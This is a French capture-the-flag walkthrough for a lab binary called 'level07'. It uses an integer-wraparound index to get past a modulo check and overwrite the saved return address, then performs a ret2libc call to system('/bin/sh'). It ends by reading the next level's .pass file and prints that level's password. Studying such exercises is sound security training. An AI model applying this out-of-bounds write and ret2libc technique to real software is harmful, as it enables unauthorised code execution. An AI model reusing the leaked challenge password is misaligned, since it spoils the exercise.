# Level07

```shell
$ ./level07
----------------------------------------------------
  Welcome to wil\'s crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 1
 Index: 2
 Completed store command successfully
Input command: read
 Index: 2
 Number at data[2] is 1
 Completed read command successfully
Input command: quit
```

On cherche à écrire par dessus l'eip du main car la commande `store` est très peu protegée dans l'executable `level07`

On va donc chercher la distance entre le début du tableau et l'eip

```shell
$ gdb level07 -q
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.

(gdb) b *main+15
Breakpoint 1 at 0x8048732

(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048732 in main ()

(gdb) print ($ebp + 0x4) - ($esp + 0x24)
$4 = 456

(gdb) print 456 / 4
$5 = 114
```

456 octets les séparent, soit `index = 114` vu que c'est un tableau d'`int`. Or `114 % 3 = 0` donc nous devons contourner cette protection dans la fonction `store`.

```python
dist_octet = 456
loop_it = 0xffff_ffff + 1

dist_octet + loop_it = 4_294_967_752
4_294_967_752 >> 2 = 1_073_741_938

# index: 114 <=> 1073741938
```

Nous allons faire un ret2libc. On va aller cherche l'adresse de `system` et de `bin/sh`

```shell
$ gdb level07 -q
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.

(gdb) b *main
Breakpoint 1 at 0x8048723

(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048723 in main ()

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

- <code>AdresseSystem: 0xf7e6aed0 <=> 4159090384</code>
- <code>AdresseBinSH: 0xf7f897ec <=> 4160264172</code>

On a plus qu'a essayer

```shell
level07:$ ./level07
----------------------------------------------------
  Welcome to wil\'s crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
